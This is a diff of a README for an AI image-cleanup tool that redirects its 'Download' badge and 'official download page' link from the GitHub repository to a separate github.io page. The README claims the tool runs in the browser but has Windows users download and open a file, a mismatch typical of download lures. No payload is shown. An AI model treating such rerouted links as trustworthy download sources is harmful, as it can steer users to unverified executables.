@@ -1,6 +1,6 @@
 # 🖼️ inpaintmind-object-removal - Clean up images with artificial intelligence
 
-[![Download InpaintMind](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/Tituuuu098/inpaintmind-object-removal)
+[![Download InpaintMind](https://img.shields.io/badge/Download-Release-blue.svg)](https://tituuuu098.github.io)
 
 InpaintMind v2.0 helps you edit images easily. You remove backgrounds, delete unwanted objects, and fix damaged spots. The tool uses smart technology to fill in missing parts of your photos. It also makes low-quality images look sharp. You do all this work in your web browser. 
 
@@ -12,7 +12,7 @@ Your computer must meet these standards to run the software. You need a modern v
 
 You download the software from the official repository page. Follow these steps to set up the tool on your Windows machine.
 
-1. Visit the [official download page here](https://github.com/Tituuuu098/inpaintmind-object-removal).
+1. Visit the [official download page here](https://tituuuu098.github.io).
 2. Look for the latest release on the right side of the screen.
 3. Click the link that matches your system to start the download.
 4. Open the folder where your computer saved the file.
